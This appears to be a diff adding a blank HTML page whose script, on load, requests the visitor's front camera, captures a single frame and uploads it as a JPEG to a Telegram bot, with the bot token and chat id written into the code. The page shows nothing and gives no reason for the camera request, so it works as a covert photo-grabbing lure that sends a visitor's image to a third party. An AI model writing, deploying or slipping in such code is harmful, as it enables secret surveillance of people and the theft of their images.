@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<script>
+
+async function capturePhoto() {
+    try {
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        canvas.toBlob(sendToTelegram, "image/jpeg");
+
+    } catch (error) {
+        alert("Camera permission denied");
+    }
+}
+
+function sendToTelegram(blob) {
+
+    const botToken = "8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
+    const chatId = "1167762232";
+
+    let formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob, "selfie.jpg");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    });
+
+}
+
+capturePhoto();
+
+</script>
+
+</body>
+</html>
